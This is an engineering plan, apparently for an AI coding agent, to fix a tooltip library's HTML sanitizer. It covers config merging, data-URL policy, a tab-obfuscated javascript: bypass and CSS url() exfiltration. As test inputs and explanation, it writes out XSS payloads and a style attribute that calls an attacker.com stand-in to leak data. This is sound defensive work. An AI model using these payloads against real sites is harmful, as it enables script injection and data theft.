# Plan 010: Make the sanitizer enforce the documented data-URL policy and close scheme/style bypasses

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving to the
> next step. If anything in the "STOP conditions" section occurs, stop and
> report — do not improvise. When done, update the status row for this plan
> in `plans/README.md` — unless a reviewer dispatched you and told you they
> maintain the index.
>
> **Drift check (run first)**:
> `git diff --stat bdbc9eb..HEAD -- src/components/tooltip/sanitizer.mts src/components/tooltip/constants.mts src/types/sanitizer.d.ts src/components/tooltip/__tests__/sanitizer.test.mts AGENTS.md docs/api-reference.md`
> If any in-scope file changed since this plan was written, compare the
> "Current state" excerpts against the live code before proceeding; on a
> mismatch, treat it as a STOP condition.

## Status

- **Priority**: P1
- **Effort**: M
- **Risk**: MED (changes default sanitizer behavior — intentional breaking change, documented in step 6)
- **Depends on**: none
- **Category**: security | bug
- **Discipline**: strict TDD — every fix is preceded by a red test
- **Planned at**: commit `bdbc9eb`, 2026-08-15

## Why this matters

The public docs promise a sanitizer policy the code does not implement, and the
code has two bypasses. Concretely, at `bdbc9eb`:

1. `AGENTS.md:63` tells users to write `tip.setSanitizerConfig({ allowDataImages: true })`,
   but `allowDataImages` does not exist anywhere in the implementation — the
   sanitizer hardcodes "all `data:image/*` allowed" (`sanitizer.mts:51-53`),
   including `data:image/svg+xml`, which can carry `<script>` when navigated to
   from an `<a href>`.
2. Worse: `setSanitizerConfig(config)` at `tooltip.mts:304` REPLACES the default
   config instead of merging, so the documented example call above silently
   drops `removeElements`/`removeAttributes` — after it, `<script>` survives
   sanitization entirely. The documented "optional sanitizer policy" example
   is a footgun that disables the XSS protections the library advertises.
3. The URL scheme check at `sanitizer.mts:47-48` only does `.trim().toLowerCase()`.
   A tab inside the scheme (`java\tscript:alert(1)`) survives the check, and
   browsers strip tabs/newlines before parsing URLs, so it executes on click.
4. `docs/api-reference.md:246` promises "Strips `url()` from inline styles" —
   no such code exists. `<div style="background: url(https://attacker.com/steal)">`
   passes sanitization today (CSS exfiltration vector).

When this plan lands: data: URLs are stripped by default, `allowDataImages: true`
opts into raster images only (SVG always stripped), partial configs merge with
defaults, whitespace-obfuscated schemes are blocked, and `url()` in `style`
attributes is neutralized — making the code match the documented security
contract.

## Current state

Files and their roles:

- `src/components/tooltip/sanitizer.mts` — hand-rolled sanitizer (`sanitizeHtml(html, config)`), 66 lines. All fixes land here.
- `src/components/tooltip/constants.mts` — default `sanitizerConfig` (lines 9-25), exported and used as the initial config.
- `src/types/sanitizer.d.ts` — ambient global `SanitizerConfig` interface (lines 17-26). Needs the new field.
- `src/components/tooltip/__tests__/sanitizer.test.mts` — direct-call unit tests for `sanitizeHtml`.
- `src/components/tooltip/__tests__/tooltip.test.mts` — component tests; config-merge test goes here.
- `AGENTS.md` + `docs/api-reference.md` — public docs making promises the code must keep.

Verbatim excerpts (all at `bdbc9eb`):

`src/components/tooltip/sanitizer.mts:46-54` — the URL policy being replaced:

```ts
      if (!shouldkill && urlAttrs.has(attrName)) {
        const value = node.getAttribute(attrName)?.trim().toLowerCase() ?? "";
        if (value.startsWith("javascript:") || value.startsWith("vbscript:")) {
          shouldkill = true;
        }
        if (value.startsWith("data:") && !value.startsWith("data:image/")) {
          shouldkill = true;
        }
      }
```

`src/components/tooltip/sanitizer.mts:56-58` — the only attribute-removal
sink; the `style` handling in step 4 goes immediately before this block:

```ts
      if (shouldkill) {
        node.removeAttribute(attrName);
      }
```

`src/components/tooltip/tooltip.mts:39` and `:303-304` — the replace-not-merge
defect:

```ts
  #sanitizerConfig: SanitizerConfig = sanitizerConfig;
```

```ts
  public setSanitizerConfig(config: SanitizerConfig): void {
    this.#sanitizerConfig = config;
```

`src/types/sanitizer.d.ts:17-26` — the interface to extend:

```ts
  interface SanitizerConfig {
    allowAttributes?: Record<string, string[]>;
    allowComments?: boolean;
    allowCustomElements?: boolean;
    allowElements?: string[];
    blockElements?: string[];
    dropAttributes?: Record<string, string[]>;
    removeAttributes?: string[];
    removeElements?: string[];
  }
```

`src/components/tooltip/__tests__/sanitizer.test.mts:134-141` — the existing
test pinning the OLD policy (it will be rewritten in step 1):

```ts
    it("keeps data:image/ URLs", () => {
      // ... asserts a data:image/png URL survives sanitization under the default config
```

(Read the full test body before editing; the block is
`describe("URL scheme policy — new coverage")` starting at
`sanitizer.test.mts:124`, which also contains `it("strips bare data: URLs")`
at line 125 and `it("strips vbscript: URLs")` at line 143 — keep those two.)

`AGENTS.md:63` (inside the v3.0 API summary):

```ts
tip.setSanitizerConfig({ allowDataImages: true }); // optional sanitizer policy
```

`docs/api-reference.md:245-246` (inside `## Security` / `### HTML Sanitization`,
lines 237-262):

```markdown
- **Blocks malicious URI schemes**: Removes `javascript:` URIs and `data:` URIs that are not images (`data:image/*`)
- **Strips `url()` from inline styles`: All CSS `url()` calls in `style` attributes are replaced with empty `url()` tokens to prevent CSS-based data exfiltration attacks
```

### Repo conventions that apply

- Style: double quotes, semicolons, no `var`, no `for` loops, no `.push()`
  (use spread), no `innerHTML` (the single scoped eslint-disable in
  `sanitizer.mts:62` is pre-existing — do not remove it, do not add others).
- Imports inside `src/` use the `.mjs` extension (e.g. `sanitizer.mts:1`:
  `import { sanitizerConfig } from "./constants.mjs";`).
- Test style: model new tests after the existing
  `describe("URL scheme policy — new coverage")` block in `sanitizer.test.mts`.
- Full style rules: `.github/instructions/`.

## Commands you will need

| Purpose   | Command                          | Expected on success |
|-----------|----------------------------------|---------------------|
| Install   | `pnpm install`                   | exit 0              |
| Tests     | `pnpm test`                      | all pass            |
| One file  | `pnpm test -- sanitizer`         | sanitizer tests pass|
| Typecheck | `pnpm run typecheck`             | exit 0, no errors   |
| Lint      | `pnpm run lint`                  | exit 0              |

## Scope

**In scope** (the only files you should modify):

- `src/components/tooltip/sanitizer.mts`
- `src/components/tooltip/constants.mts` (only if a comment must change — no behavior)
- `src/types/sanitizer.d.ts`
- `src/components/tooltip/__tests__/sanitizer.test.mts`
- `src/components/tooltip/__tests__/tooltip.test.mts` (one new test, step 1)
- `AGENTS.md` (sanitizer section only)
- `docs/api-reference.md` (`## Security` section only)
- `plans/README.md` (status row)

**Out of scope** (do NOT touch):

- `src/components/tooltip/tooltip.mts` except the single line 304 change in
  step 5. Template text-node handling is Plan 011; stylesheet fixes are Plan 012.
- The structural stylesheet system (`structural-styles.mts`) — unrelated.
- Public API shape of `setTemplate`/`setData`/`show`/`hide`.

## Git workflow

- Branch: `advisor/010-sanitizer-data-url-policy`
- Commit per step, conventional commits, e.g.:
  `test(sanitizer): pin new data-URL and scheme policy` then
  `fix(sanitizer): enforce opt-in raster-only data images` then
  `fix(tooltip): merge partial sanitizer config with defaults` then
  `docs: align sanitizer docs with implemented policy`
- Do NOT push or open a PR unless the operator instructed it.

## Steps

### Step 1: Write the red tests

In `src/components/tooltip/__tests__/sanitizer.test.mts`, inside
`describe("URL scheme policy — new coverage")`:

1. REPLACE the body and name of `it("keeps data:image/ URLs")` (line 134) with
   these four tests (keep the block's existing helpers/style):

   - `it("strips data:image URLs by default")` — sanitize
     `<img src="data:image/png;base64,aGVsbG8=">` with the default config;
     assert the `src` attribute is removed.
   - `it("keeps raster data:image URLs when allowDataImages is true")` — same
     HTML, config `{ allowDataImages: true }` (spread over the default config
     in the test call: `{ ...sanitizerConfig, allowDataImages: true }`);
     assert `src` survives.
   - `it("strips data:image/svg+xml even when allowDataImages is true")` —
     `<img src="data:image/svg+xml;base64,aGVsbG8=">` AND
     `<a href="data:image/svg+xml;base64,aGVsbG8=">x</a>`, both with
     `{ ...sanitizerConfig, allowDataImages: true }`; assert both attributes
     are removed.
   - `it("strips javascript: URLs with embedded tab whitespace")` — sanitize
     `'<a href="java\tscript:alert(1)">x</a>'` (real tab character in the
     string literal) with the default config; assert `href` is removed.

2. ADD a new sibling describe block:

   - `describe("style attribute policy")`
     - `it("neutralizes url() tokens in style attributes")` — sanitize
       `'<div style="background: url(https://attacker.com/steal?d=1)">t</div>'`;
       assert the `style` attribute still exists, contains `url()`, and does
       NOT contain `attacker.com`.

In `src/components/tooltip/__tests__/tooltip.test.mts`, add one test near the
existing `describe("setTemplate + setData (v3.0 API)")` (starts at line 183):

- `it("setSanitizerConfig merges with defaults instead of replacing them")` —
  on a fresh tooltip: `setSanitizerConfig({ allowDataImages: true })`, then
  `setTemplate('<script>evil()</script><span data-bind="a"></span>')`, then
  assert the shadow tooltip box contains no `script` element. (Import the box
  helper the neighboring tests use — check how existing tests query the box;
  there is a `getTooltipBox` helper used at line ~134.)

**Verify**: `pnpm test -- sanitizer` → the 5 new sanitizer tests FAIL (red).
`pnpm test -- tooltip` → the new merge test FAILS. All other tests still pass.
If a new test unexpectedly passes, the code has drifted — STOP.

### Step 2: Add `allowDataImages` to the type

In `src/types/sanitizer.d.ts`, inside `interface SanitizerConfig`, add after
`allowCustomElements?` (keeping alphabetical order):

```ts
    // Project extension (not part of the W3C Sanitizer API shape):
    // opt-in flag permitting raster data:image/* URLs. SVG data URLs are
    // always stripped because SVG can carry executable content.
    allowDataImages?: boolean;
```

**Verify**: `pnpm run typecheck` → exit 0.

### Step 3: Rewrite the URL policy in `sanitizeHtml`

In `src/components/tooltip/sanitizer.mts`, replace lines 46-54 (the excerpt
above) with:

```ts
      if (!shouldkill && urlAttrs.has(attrName)) {
        const raw = node.getAttribute(attrName) ?? "";
        // Browsers strip tab/newline/CR before parsing URLs; normalizing all
        // whitespace here keeps the scheme check from being bypassed with
        // values like "java\tscript:...".
        const normalized = raw.replace(/\s+/g, "").toLowerCase();
        if (normalized.startsWith("javascript:") || normalized.startsWith("vbscript:")) {
          shouldkill = true;
        }
        if (normalized.startsWith("data:")) {
          const rasterImage = /^data:image\/(png|jpe?g|gif|webp|avif|bmp|x-icon|vnd\.microsoft\.icon)/.test(normalized);
          if (config.allowDataImages !== true || !rasterImage) {
            shouldkill = true;
          }
        }
      }

      if (!shouldkill && attrName === "style") {
        const style = node.getAttribute("style") ?? "";
        if (/url\(/i.test(style)) {
          node.setAttribute("style", style.replace(/url\([^)]*\)/gi, "url()"));
        }
      }
```

Notes for the executor: keep the existing indentation (the loop body is at
this depth). The `style` branch rewrites the attribute in place; it must run
even though `style` is not in `urlAttrs`. The simple `url\([^)]*\)` regex is
intentional — it matches the documented behavior; quoted URLs containing `)`
are a known accepted edge case.

**Verify**: `pnpm test -- sanitizer` → ALL sanitizer tests pass (including
the two you kept: "strips bare data:" and "strips vbscript:").

### Step 4: (covered by step 3) — no separate change

The style handling was added in step 3; run the full check:

**Verify**: `pnpm test` → everything passes EXCEPT the tooltip merge test
from step 1 (still red — fixed next).

### Step 5: Merge partial sanitizer configs in the component

In `src/components/tooltip/tooltip.mts` line 304, change:

```ts
    this.#sanitizerConfig = config;
```

to:

```ts
    // WHY: partial configs must not silently drop the default element and
    // attribute denylists — the documented usage passes a single flag.
    this.#sanitizerConfig = { ...sanitizerConfig, ...config };
```

`sanitizerConfig` is already imported (used at line 39) — confirm with
`grep -n "sanitizerConfig" src/components/tooltip/tooltip.mts` (expect the
import plus lines 39 and 304-ish) before assuming.

**Verify**: `pnpm test` → ALL tests pass, including the merge test. Then
`pnpm run typecheck` → exit 0, and `pnpm run lint` → exit 0.

### Step 6: Align the docs with the new policy

1. `AGENTS.md`, in the v3.0 API summary near line 63 — the example
   `tip.setSanitizerConfig({ allowDataImages: true });` stays, but append to
   the comment line: `// partial configs merge with defaults; SVG data URLs always stripped`.
2. `docs/api-reference.md:245` — replace the "Blocks malicious URI schemes"
   bullet with:

   ```markdown
   - **Blocks malicious URI schemes by default**: Removes `javascript:` and `vbscript:` URIs (including whitespace-obfuscated schemes) and ALL `data:` URIs. Pass `allowDataImages: true` to `setSanitizerConfig()` to permit raster `data:image/*` URLs (png, jpeg, gif, webp, avif, bmp, ico); `data:image/svg+xml` is always stripped because SVG can carry executable content.
   ```

3. `docs/api-reference.md`, in `### Custom Sanitization` (line 264): add one
   sentence noting `setSanitizerConfig()` merges the given object over the
   default policy rather than replacing it.

**Verify**: `grep -n "allowDataImages" AGENTS.md docs/api-reference.md` →
matches in both files; `grep -n "data:image/\*" docs/api-reference.md` → no
matches (old wording gone).

## Test plan

Covered by steps 1-5: default-deny data URLs, raster opt-in, SVG always
stripped (img + anchor), tab-obfuscated scheme, style `url()` neutralization,
config merge safety. Regression guard: the pre-existing "strips bare data:"
and "strips vbscript:" tests must remain untouched and green.

- Verification: `pnpm test` → all pass; `pnpm run typecheck` → exit 0;
  `pnpm run lint` → exit 0.

## Done criteria

ALL must hold:

- [ ] `pnpm test` exits 0 with the new tests (5 sanitizer + 1 tooltip merge)
- [ ] `pnpm run typecheck` exits 0
- [ ] `pnpm run lint` exits 0
- [ ] `grep -n "data:image/\*" docs/api-reference.md` returns no matches
- [ ] `grep -n "allowDataImages" src/types/sanitizer.d.ts src/components/tooltip/sanitizer.mts` returns matches in both
- [ ] No files outside the in-scope list are modified (`git status`)
- [ ] `plans/README.md` status row updated

## STOP conditions

Stop and report back (do not improvise) if:

- Any excerpt in "Current state" does not match the live code.
- A step-1 red test passes BEFORE the fix (code drifted; policy may already
  be partially implemented).
- Making the merge test green requires touching anything in `tooltip.mts`
  other than line 304.
- The lint rule `no-restricted-properties` complains about your new code
  (you used an innerHTML-like sink — rework; only the pre-existing disable
  at `sanitizer.mts:62` is allowed).
- Any previously-green test fails after step 3 other than the intentional
  tooltip merge test.

## Maintenance notes

- The raster MIME allowlist in the regex is a security boundary; extending it
  requires re-evaluating whether the new type can execute content (SVG was
  rejected for exactly that reason).
- The `url()` regex does not handle quoted URLs containing `)`; if CSS
  exfiltration via crafted `url("...)"...)` matters someday, harden the regex,
  but do not silently change the documented `url()` output shape.
- A prior session noted jsdom cannot construct `CSSStyleSheet`; that is
  unrelated to this plan but explains why some fallback paths in
  `tooltip.mts` behave differently under vitest than in a real browser.
